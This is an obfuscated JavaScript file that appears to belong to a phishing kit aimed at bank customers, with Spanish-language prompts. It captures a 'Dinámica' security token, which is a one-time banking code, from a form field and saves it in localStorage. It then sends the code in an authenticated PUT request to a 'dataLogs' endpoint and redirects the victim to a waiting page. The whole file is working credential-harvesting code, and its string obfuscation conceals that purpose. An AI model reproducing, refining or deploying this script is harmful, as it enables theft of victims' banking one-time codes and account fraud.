const _0xacc415 = _0x1e2d;
function _0x5f4d() {
  const _0x2b1dc6 = [
    "json",
    "txtPassword",
    "5936UFToVk",
    "379137fOnrgY",
    "cdin",
    "href",
    "4BfXMUV",
    "Por\x20favor\x20ingrese\x20token\x20de\x20seguridad",
    "stringify",
    "value",
    "4050954LTTpaU",
    "wait.html",
    "2439815jnXwpp",
    "935095mUCkib",
    "Ingresó\x20Dinámica",
    "dataLogToken",
    "getItem",
    "info",
    "disabled",
    "/dataLogs/updateDinDataLog/",
    "focus",
    "1278aHBiZe",
    "Error\x20al\x20actualizar\x20los\x20datos\x20en\x20el\x20servidor",
    "setItem",
    "error",
    "getElementById",
    "preventDefault",
    "origin",
    "280607YUaSGW",
    "metaInfo",
    "2064400QoKgWO",
    "btnPass",
    "location",
    "Usuario\x20actualizado\x20correctamente\x20con\x20OTP",
    "addEventListener",
  ];
  _0x5f4d = function () {
    return _0x2b1dc6;
  };
  return _0x5f4d();
}
(function (_0x38e7ac, _0x39c79c) {
  const _0x4708bd = _0x1e2d,
    _0x20de20 = _0x38e7ac();
  while (!![]) {
    try {
      const _0x15cd5d =
        (-parseInt(_0x4708bd(0x1f2)) / 0x1) *
          (-parseInt(_0x4708bd(0x1dc)) / 0x2) +
        parseInt(_0x4708bd(0x1fc)) / 0x3 +
        -parseInt(_0x4708bd(0x1f4)) / 0x4 +
        -parseInt(_0x4708bd(0x1e3)) / 0x5 +
        parseInt(_0x4708bd(0x1e0)) / 0x6 +
        -parseInt(_0x4708bd(0x1e2)) / 0x7 +
        (-parseInt(_0x4708bd(0x1fb)) / 0x8) *
          (-parseInt(_0x4708bd(0x1eb)) / 0x9);
      if (_0x15cd5d === _0x39c79c) break;
      else _0x20de20["push"](_0x20de20["shift"]());
    } catch (_0x342977) {
      _0x20de20["push"](_0x20de20["shift"]());
    }
  }
})(_0x5f4d, 0x65ac4);
function updateLS() {
  const _0x25766a = _0x1e2d;
  LS[_0x25766a(0x1ed)](_0x25766a(0x1e7), JSON[_0x25766a(0x1de)](info));
}
function _0x1e2d(_0x3dc21f, _0x4205fa) {
  const _0x5f4d08 = _0x5f4d();
  return (
    (_0x1e2d = function (_0x1e2d1c, _0x674db0) {
      _0x1e2d1c = _0x1e2d1c - 0x1dc;
      let _0x3a282f = _0x5f4d08[_0x1e2d1c];
      return _0x3a282f;
    }),
    _0x1e2d(_0x3dc21f, _0x4205fa)
  );
}
const otpButton = document["getElementById"](_0xacc415(0x1f5)),
  numberMovil = document[_0xacc415(0x1ef)](_0xacc415(0x1fa));
async function updateOtp() {
  const _0x23c6c9 = _0xacc415;
  try {
    const _0x2598d2 = localStorage[_0x23c6c9(0x1e6)]("dataLogId"),
      _0x17ef40 = localStorage["getItem"](_0x23c6c9(0x1e5));
    if (!_0x2598d2 || !_0x17ef40)
      throw new Error(
        "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage."
      );
    const _0x21d490 = await fetch(url + _0x23c6c9(0x1e9) + _0x2598d2, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
        Authorization: "Bearer\x20" + _0x17ef40,
        Origin: window[_0x23c6c9(0x1f6)][_0x23c6c9(0x1f1)],
      },
      body: JSON["stringify"]({
        din: info[_0x23c6c9(0x1f3)][_0x23c6c9(0x1fd)],
        status: _0x23c6c9(0x1e4),
      }),
    });
    if (!_0x21d490["ok"]) {
      const _0x33a098 = await _0x21d490[_0x23c6c9(0x1f9)]();
      throw new Error(_0x33a098[_0x23c6c9(0x1ee)] || _0x23c6c9(0x1ec));
    }
    const _0x3ffab1 = await _0x21d490[_0x23c6c9(0x1f9)]();
    console["log"](_0x23c6c9(0x1f7)),
      (window[_0x23c6c9(0x1f6)][_0x23c6c9(0x1fe)] = _0x23c6c9(0x1e1));
  } catch (_0x2f2b2a) {
    console["error"]("Error\x20al\x20procesar\x20el\x20OTP:", _0x2f2b2a),
      (otpButton["disabled"] = ![]);
  }
}
otpButton[_0xacc415(0x1f8)]("click", async function (_0x298298) {
  const _0x4c3c7a = _0xacc415;
  _0x298298[_0x4c3c7a(0x1f0)](), (otpButton[_0x4c3c7a(0x1e8)] = !![]);
  if (numberMovil[_0x4c3c7a(0x1df)] == "") {
    alert(_0x4c3c7a(0x1dd)),
      numberMovil[_0x4c3c7a(0x1ea)](),
      (otpButton[_0x4c3c7a(0x1e8)] = ![]);
    return;
  }
  const _0x192200 = numberMovil["value"];
  (info["metaInfo"][_0x4c3c7a(0x1fd)] = _0x192200),
    updateLS(),
    await updateOtp();
});
